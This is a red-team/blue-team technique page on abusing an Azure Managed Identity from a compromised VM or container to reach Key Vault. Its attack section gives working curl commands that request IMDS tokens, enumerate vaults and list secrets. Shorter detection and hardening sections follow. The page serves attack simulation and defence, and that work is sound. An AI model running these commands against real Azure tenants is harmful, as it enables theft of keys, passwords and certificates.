# [PE-DISCOVER-001]: Azure Key Vault Managed Identity Discovery

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-DISCOVER-001 |
| **MITRE ATT&CK v18.1** | [Cloud Infrastructure Discovery (T1580)](https://attack.mitre.org/techniques/T1580/) |
| **Tactic** | Discovery / Credential Access |
| **Platforms** | Azure / Entra ID |
| **Severity** | **High** |
| **CVE** | **CVE-2023-28432** (Contextual Precursor) |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This technique involves discovering and abusing the **Managed Identity** assigned to a compromised Azure resource (e.g., VM, App Service, or Container) to access Azure Key Vaults. Attackers who gain initial access (e.g., via **CVE-2023-28432** in MinIO or a webshell) can query the internal **Instance Metadata Service (IMDS)** to obtain an OAuth token for `https://vault.azure.net`. Using this token, they can enumerate all Key Vaults the identity has access to and retrieve sensitive secrets (API keys, passwords, certificates), effectively bypassing perimeter authentication.
- **Attack Surface:** Azure Instance Metadata Service (IMDS) & Key Vault.
- **Business Impact:** **Data Breach**. Access to critical secrets used by the application.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Remote Code Execution (RCE) or SSRF on an Azure Resource.
- **Tools:**
    - `curl` / `Invoke-RestMethod`
    - Azure CLI

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Obtain Management Token**
First, get a token for the Azure Management API to discover *which* Key Vaults exist.
```bash
# From inside the compromised VM/Pod
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H 'Metadata: true'
```

**Step 2: Enumerate Key Vaults**
Use the Management token to list Key Vaults in the subscription.
```bash
curl -H "Authorization: Bearer <TOKEN>" "https://management.azure.com/subscriptions/<SUB_ID>/resources?`$filter=resourceType eq 'Microsoft.KeyVault/vaults'&api-version=2019-10-01"
```

**Step 3: Access Key Vault**
Request a *new* token specifically for the Key Vault service (`resource=https://vault.azure.net`).
```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -H 'Metadata: true'
```

**Step 4: Dump Secrets**
Use the Vault token to list secrets in the target vault.
```bash
curl -H "Authorization: Bearer <VAULT_TOKEN>" "https://<VAULT_NAME>.vault.azure.net/secrets?api-version=7.4"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Azure Logs
| Source | Event | Filter Logic |
|---|---|---|
| **KeyVault** | `SecretGet` / `SecretList` | Access attempts from the IP address of a compute resource that normally implies application logic (verify if the pattern matches expected behavior). |
| **ActivityLog** | `Get Access Token` | (Not logged by default) High volume of IMDS token requests can be inferred from subsequent API failures if the attacker enumerates incorrectly. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Least Privilege:** Ensure Managed Identities have only the *exact* permissions needed (e.g., "Key Vault Secrets User" on a specific vault), not "Contributor" on the Subscription.
*   **Network Isolation:** Use **Private Endpoints** for Key Vaults and disable public access. This forces attackers to be inside the network to access the vault, though a compromised VM is already "inside".

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-001] (e.g., CVE-2023-28432)
> **Next Logical Step:** [PE-VALID-011]
